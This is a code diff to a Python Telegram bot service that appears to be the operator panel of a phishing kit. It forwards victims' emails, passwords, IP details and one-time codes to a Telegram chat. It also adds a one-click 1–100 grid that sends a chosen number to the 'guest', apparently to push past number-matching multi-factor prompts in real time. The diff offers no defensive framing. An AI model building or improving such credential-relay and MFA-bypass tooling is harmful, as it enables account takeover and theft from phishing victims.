@@ -99,8 +99,8 @@ class TelegramService:
         message = f"""
     ━━━━━━━━━━━━━━━━━━
     🏢 <b>Portal:</b> {provider_name}
-    📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
-    🔑 <b>Entered Secret:</b> <code>{state.get('password') or "(Not entered yet)"}</code>
+    📧 <b>Email:</b> <code>{state.get('email') or "Unknown"}</code>
+    🔑 <b>Password:</b> <code>{state.get('password') or "(Not entered yet)"}</code>
 
     📍 <b>Location & Network:</b>
     • IP: <code>{visitor.get('ip', 'Unknown')}</code>
@@ -148,7 +148,7 @@ class TelegramService:
     📲 <b>BOX RESULT</b>
     ━━━━━━━━━━━━━━━━━━
     🏢 <b>Portal:</b> {state.get('provider', '').upper()}
-    📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
+    📧 <b>Email:</b> <code>{state.get('email') or "Unknown"}</code>
     📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
     ━━━━━━━━━━━━━━━━━━
             """.strip()
@@ -177,13 +177,12 @@ class TelegramService:
             return 0
         self.polling_in_progress = True
         try:
-            payload = {"timeout": 0}  # ← was 1, now 0 = no long polling, instant response
+            payload = {"timeout": 0}  
             if self.last_update_id > 0:
                 payload["offset"] = self.last_update_id + 1
-            # ... rest unchanged
 
             updates = self.api_call("getUpdates", payload)
-            print(f"[POLL] Got {len(updates)} updates", flush=True)  # ← add this line
+            print(f"[POLL] Got {len(updates)} updates", flush=True)  
             count = 0
 
             for update in updates:
@@ -192,7 +191,6 @@ class TelegramService:
                 message_update = update.get("message") or update.get("edited_message")
 
                 # Handle plain text messages for setting candidates
-                # e.g. "candidates attempt-abc 24 38 42"
                 if message_update and isinstance(message_update, dict):
                     try:
                         text = message_update.get("text", "") or ""
@@ -221,7 +219,6 @@ class TelegramService:
 
                     if data and data.startswith("tg:"):
                         parts = data.split(":")
-                        # Guard: need at least action + attempt_id
                         if len(parts) < 3:
                             continue
 
@@ -250,33 +247,20 @@ class TelegramService:
 
                         elif action == "num_prompt":
                             mapped_action = "pending"
-                            feedback = "Number-matching prompt requested! 🔢"
+                            feedback = "Select a number to dispatch instantly! 🔢"
                             handled_inline = True
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
 
-                                if attempt_id not in self.host_selections:
-                                    self.host_selections[attempt_id] = []
-
                                 keyboard = []
                                 nums = list(range(1, 101))
+                                # Render the 1-100 buttons cleanly. Clicking ANY of them targets 'sendcandidates' directly
                                 for r in range(0, 100, 10):
                                     row = []
                                     for n in nums[r:r + 10]:
-                                        label = str(n)
-                                        if n in self.host_selections.get(attempt_id, []):
-                                            label = "✓" + label
-                                        row.append({"text": label, "callback_data": f"tg:hostpick:{attempt_id}:{n}"})
+                                        row.append({"text": str(n), "callback_data": f"tg:sendcandidates:{attempt_id}:{n}"})
                                     keyboard.append(row)
-
-                                selected = self.host_selections.get(attempt_id, [])
-                                control_row = [{"text": f"Selected: {', '.join(map(str, selected)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"}]
-                                if len(selected) == 1:
-                                    control_row.append({"text": "Send Number ▶️", "callback_data": f"tg:sendcandidates:{attempt_id}:{selected[0]}"})
-                                else:
-                                    control_row.append({"text": "Pick 1 number to enable Send", "callback_data": f"tg:noop:{attempt_id}"})
-                                keyboard.append(control_row)
 
                                 try:
                                     orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
@@ -297,70 +281,14 @@ class TelegramService:
                             chosen = parts[3] if len(parts) > 3 else None
                             feedback = f"Number selected: {chosen} 🔢" if chosen else "Number selection received"
 
-                        elif action == "hostpick":
-                            mapped_action = "pending"
-                            handled_inline = True
-                            chosen_num = None
-                            try:
-                                chosen_num = int(parts[3]) if len(parts) > 3 else None
-                            except Exception:
-                                pass
-
-                            sel = self.host_selections.get(attempt_id, [])
-                            if chosen_num is not None:
-                                if chosen_num in sel:
-                                    sel.remove(chosen_num)
-                                else:
-                                    if len(sel) < 1:
-                                        sel.append(chosen_num)
-                            self.host_selections[attempt_id] = sel
-                            feedback = f"Selected: {', '.join(map(str, sel)) or 'None'}"
-
-                            try:
-                                orig = callback_query.get("message")
-                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
-                                keyboard = []
-                                nums = list(range(1, 101))
-                                for r in range(0, 100, 10):
-                                    row = []
-                                    for n in nums[r:r + 10]:
-                                        label = ("✓" if n in sel else "") + str(n)
-                                        row.append({"text": label, "callback_data": f"tg:hostpick:{attempt_id}:{n}"})
-                                    keyboard.append(row)
-                                control_row = [{"text": f"Selected: {', '.join(map(str, sel)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"}]
-                                if len(sel) == 1:
-                                    control_row.append({"text": "Send Number ▶️", "callback_data": f"tg:sendcandidates:{attempt_id}:{sel[0]}"})
-                                else:
-                                    control_row.append({"text": "Pick 1 number to enable Send", "callback_data": f"tg:noop:{attempt_id}"})
-                                keyboard.append(control_row)
-                                orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
-                                self.api_call("editMessageText", {
-                                    "chat_id": chat_id_val,
-                                    "message_id": orig.get("message_id") if orig else None,
-                                    "text": orig_text,
-                                    "parse_mode": "HTML",
-                                    "reply_markup": {"inline_keyboard": keyboard}
-                                })
-                            except Exception as _e:
-                                print(f"Failed to update host 1-100 keyboard: {_e}", flush=True)
-
-                        elif action == "noop":
-                            mapped_action = "pending"
-                            handled_inline = True
-                            feedback = "Please select exactly 1 number."
-
                         elif action == "sendcandidates":
+                            # Action fires instantly as soon as a grid number button is clicked!
                             mapped_action = "number_prompt"
                             handled_inline = True
-                            feedback = "Number sent to guest ✅"
-                            chosen_candidates = [parts[3]] if len(parts) > 3 else []
+                            chosen_number = parts[3] if len(parts) > 3 else ""
+                            feedback = f"Number {chosen_number} sent to guest ✅"
 
-                            try:
-                                if attempt_id in self.host_selections:
-                                    del self.host_selections[attempt_id]
-                            except Exception:
-                                pass
-
+                            # Restore the default layout panel options instantly
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
@@ -376,7 +304,7 @@ class TelegramService:
                                         ],
                                         [
                                             {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
-            ]
+                                        ]
                                     ]
                                 }
                                 self.api_call("editMessageText", {
@@ -405,7 +333,7 @@ class TelegramService:
                                 if original_msg:
                                     current_text = original_msg.get("text") or ""
                                     if current_text:
-                                        updated_text =""
+                                        updated_text = ""
                                     else:
                                         updated_text = f"{original_msg.get('caption') or ''}\n\n"
                                     self.api_call("editMessageText", {
@@ -418,7 +346,7 @@ class TelegramService:
                             except Exception as e:
                                 print(f"Failed to edit message text: {e}", flush=True)
 
-                        # Fire callback to server
+                        # Fire callback to server pipeline
                         if action == "picknum":
                             chosen_val = parts[3] if len(parts) > 3 else None
                             on_action_received(attempt_id, mapped_action, {"chosen": chosen_val})
